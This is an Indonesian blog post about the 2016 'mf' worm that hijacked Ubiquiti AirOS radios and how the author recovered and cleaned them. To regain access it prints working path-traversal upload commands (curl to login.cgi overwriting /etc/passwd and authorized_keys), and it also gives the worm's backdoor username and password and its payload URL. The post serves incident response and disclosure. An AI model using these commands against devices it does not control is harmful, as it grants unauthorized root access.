Title: Virus Ubiquiti v5.5.x error "Invalid Credentials"
Date: 2016-06-08 14:35
Author: Dhani Setiawan
Category: Misc
Tags: Linux, Networking
Slug: ubnt-virus-exploit
Status: Published
Comments: yes


Beberapa hari lalu kami dibuat pusing karena tiba-tiba saja banyak perangkat radio Ubiquiti tidak bisa diakses. Kalau coba login ke perangkat-perangkat itu muncul pesan error "Invalid Credentials" yang berarti username atau password tidak valid.

Tidak ada satu pun manusia yang merubah password. Lagi pula perangkat yang error itu jumlahnya banyak, jadi kecil kemungkinan password dirubah secara manual dengan waktu yang hampir bersamaan. Karena itu dugaan saya pertama kali ini pasti lewat scripting.

Barangkali di antara rekan-rekan ada yang juga mengalami hal ini, ini karena virus yang menamakan dirinya _mf_ (motherfu\*\*er), nama virus yang sama sekali tidak keren. Ciri-cirinya, sebagian kasus halaman login web bisa dibuka tapi gagal login. Sebagian kasus lainnya halaman login web tidak bisa dibuka tapi perangkat router atau radio itu reply kalau di-ping. untuk yang terakhir ini akses cuma bisa lewat ssh.

Normalnya, kalau username dan password perangkat sudah berubah dan tidak bisa diakses lagi, berarti harus reset ke konfigurasi default. Ini yang buat saya agak sedikit horor karena banyaknya jumlah perangkat radio yang harus direset. Untungnya cara ini tidak perlu diambil.

Saya kemudian coba cari-cari di database bug Ubiquiti AirMAX barangkali ada bug AirOS yang jadi sumber malapetaka ini. Benar saja, di HackerOne ada bug yang tergolong baru dan bug ini bisa dieksploitasi untuk bypass autentikasi.

Sebelumnya kalau rekan-rekan ada yang belum tahu AirOS, ini OS embedded untuk perangkat jaringan (Radio dan router) Ubiquiti. OS ini pakai kernel Linux yang dibuat dari OpenWRT.

Bug ini karena tidak adanya boundscheck untuk verifikasi user input lewat webserver lighttpd. Attacker bisa eksploitasi bug ini dengan upload file tanpa autentikasi. Parahnya lagi, file yang diupload itu bisa ditempatkan di mana saja karena punya hak akses root.

Bayangkan saja kalau yang diupload itu ``ssh public key`` atau file ``passwd``. File ``passwd`` bisa buat overwrite file ``/etc/passwd``, si attacker bisa login tanpa perlu autentikasi. Apa bukan mimpi buruk ini namanya, heh?

Saya lihat log bug ini di HackerOne, penemu bug ini dapat ganjaran 18.000 dolar dari Ubiquiti, whew...!  
Ubiquiti kemudian menutup bug ini di AirOS versi 5.6.2.

&nbsp;

Kembali ke virus _motherfucker_ yang mengeksploitasi bug ini.

### Apa yang dilakukan virus ini?
Virus ini di awal-awal akan download virus dari <http://pastebin.com/raw/heNFjBVK>{target="_blank"} terus extract virus mf.tgz ke direktori ``/etc/persistent`` terus buat direktori hidden ``/etc/persistent/.mf``. Virus ini kemudian menghapus user ``ubnt``, mengganti file ``/etc/passwd`` dengan file ``passwd`` versi virus.

Ada user baru di ``passwd`` dengan nama user ``moth3r`` dan password hash ``$1$RpWdAhdc$cNgp9llO5jKApRaG8b4nK1``. Belakangan diketahui password hash itu ``fuck.3r``, seseorang di belahan bumi yang lain berhasil brut force hash itu pakai _John the Ripper_.

Selanjutnya virus ini merubah mode wireless ke master, mengganti ssid, disable dhcp server, dan disable tombol reset. Untungnya semua itu gagal, jadi tidak ada yang terubah.

Virus ini menyebar dengan melihat ``ip neighbor`` dan menyebar ke perangkat yang bertetangga dengan perangkat yang terinfeksi itu.

Siapa yang vulnerable dengan virus ini? mereka adalah perangkat radio atau router Ubiquiti AirMAX yang pakai OS dibawah 5.6.2.

&nbsp;

### Cara hapus virus
Cara paling gampang kalau bisa login ssh ke router pakai username ``moth3r`` dan password ``fuck.3r``. Dari sini hapus direktori ``/etc/persistent/.mf`` sama ``/etc/persistent/rc.poststart``.

    for i in $(ps | grep mf | awk '{print $1}' | sed 's/ //'); do kill $i; done
    rm -rf /etc/persistent/.mf
    rm -f /etc/persistent/rc.poststart
    cfgmtd -w -f /tmp/system.cfg -p /etc/
    reboot

Masalahnya, ada sebagian perangkat yang user dan password itu invalid. Jadi kita tidak tahu apa passwordnya, jadi kita harus cari cara yang lain.

Kita bisa login kembali ke perangkat Ubiquiti itu dengan cara yang sama yang dipakai exploit. saya pakai file ``passwd`` sama file ``ssh public key``.

**1) user di file passwd**  
Kita bisa pakai file ``passwd`` dari mana saja. Yang di bawah ini juga bisa dipakai.

    blah:Ddc96rtq5NYfG:0:0:Administrator:/etc/persistent:/bin/sh
    ubnt:IXpEhRnqWrjjI:100:100:Administrator:/etc/persistent:/bin/false

Tidak penting apa passwordnya karena nantinya kita login pakai ssh key.

**2) Buat ssh key**  
Ssh key bisa dibuat pakai command ``ssh-keygen``, passphrase kosong saja biar nantinya bisa login tanpa password.

    Endor > ssh-keygen -t rsa -C "blah@blah.com"
    Generating public/private rsa key pair.
    Enter file in which to save the key (/home/user/.ssh/id_rsa): blah_rsa
    Enter passphrase (empty for no passphrase): 
    Enter same passphrase again: 
    Your identification has been saved in blah_rsa.
    Your public key has been saved in blah_rsa.pub.
    The key fingerprint is:
    ff:98:31:3b:3b:ec:70:8f:3c:34:6b:09:e0:2b:f4:d6 blah@blah.com
    The key's randomart image is:
    +---[RSA 2048]----+
    |                 |
    |                 |
    |                 |
    |      .          |
    |     . .S        |
    |    . . ..o      |
    |   . . o.+=+     |
    |    . + E+OX     |
    |     o   oO=o    |
    +-----------------+
    Endor >

**3) Upload file passwd dan ssh public key**  
Di sini bug itu, kita bisa seenaknya upload file terus tempatkan file itu di mana saja tanpa perlu autentikasi. Fatal kan?

    curl -F "file=@passwd;filename=../../etc/passwd" -H "Expect:" "https://192.168.1.20/login.cgi" -k
    curl -F "file=@blah_rsa.pub;filename=../../etc/dropbear/authorized_keys" -H "Expect:" "https://192.168.1.20/login.cgi" -k

Ip address 192.168.1.20 itu contoh saja.

Kemudian coba login ssh

    ssh -i blah_rsa blah@192.168.1.20

Saya berhasil login pakai ssh key, fiuhh..!! rasanya lega sekali.

**4) Hapus virus**  
Sebelum hapus virus, kita harus kill dulu semua proses yang ada hubungannya sama mf.

    for i in $(ps | grep mf | awk '{print $1}' | sed 's/ //'); do kill $i; done
    rm -rf /etc/persistent/.mf
    rm -f /etc/persistent/rc.poststart

Masih di shell Ubiquiti, kembalikan password ke default

    /usr/bin/sed -i 's/users\.1\.password=.*/users\.1\.password=35YnFRwmUdGzc/' /tmp/system.cfg
    cfgmtd -w -f /tmp/system.cfg -p /etc/
    reboot

Lokasi ``sed`` kalau di Ubiquiti AirOS memang di ``/usr/bin/sed``, beda sama kebanyakan Linux yang ``sed`` nya ada di ``/bin/sed``.

Setelah selesai reboot, kita bisa login ke router pakai password default "``ubnt``" terus upgrade ke firmware yang baru.

Selain di atas, ada cara lain lagi yang bisa diambil.  
Virus ini awal-awal masuk ke router, dia bakalan download ``curl`` dari <http://downloads.openwrt.org>{target="_blank"} dan <http://bo.mirror.garr.it/mirrors/openwrt>{target="_blank"}. Kita bisa buat file ``curl`` palsu yang isinya script buat hapus virus. Jadi waktu virus itu coba download ``curl`` dari openwrt.org, kita alihkan supaya download dari web server lokal yang isinya file ``curl`` palsu. Begitu virus ini eksekusi ``curl``, yang ada bukannya menginfeksi tetangganya tapi malah bunuh diri.

&nbsp;

Virus ini sudah mendunia, di forum Ubiquiti ada yang mengaku punya ribuan perangkat yang terinfeksi dalam semalam saja. saya membayangkannya saja seperti mimpi buruk, apalagi mengalaminya. Saran, kalau teman-teman punya Ubiquiti dengan firmware dibawah 5.6.2 dan belum kena, segera saja upgrade ke firmware baru.

&nbsp;

**Info:**  
Tulisan ini salah satu sumbernya saya ambil dari situs www.exploit-db.com. IDWebhost yang jadi hosting provider blog ini ternyata punya policy tidak boleh nge-link ke situs yang ada kata "exploit".

Saya chatting panjang kali lebar dengan support IDWebhost karena begitu tulisan ini online malah tidak bisa diakses dengan kode 404, ternyata penyebabnya karena link itu.

Jadi source-nya yang untuk exploit-db sedikit saya sensor. Rubah ``https://www.exploxx-db.com/exploxxx/39853/`` ke ``https://www.exploit-db.com/exploits/39853/``.

&nbsp;

**Source:**  

- [https://www.exploit-db.com/exploits/39853/](https://www.exploxx-db.com/exploxxx/39853/){target="_blank"}
- <https://hackerone.com/reports/73480>{target="_blank"}
- <http://www.securityweek.com/worm-infects-many-ubiquiti-devices-old-vulnerability>{target="_blank"}

&nbsp;

**Cerita lainnya:**  
["Hampir" Semua Tentang IPv6](//devnull.web.id/networking/pengenalan-ipv6.html)  
_Tulisan tentang IPv6 yang berusaha komprehensif tapi ternyata gagal membahas semua hal tentang IPv6. “Hampir” Semua Tentang IPv6, dari sejarah, kelebihan IPv6, sampai pengalamatannya._

[Membumikan OpenStack](//devnull.web.id/openstack/pengenalan-openstack.html)  
_This is a story about How I Met <s>Your Mother</s> OpenStack, ditulis dengan Layman's term._
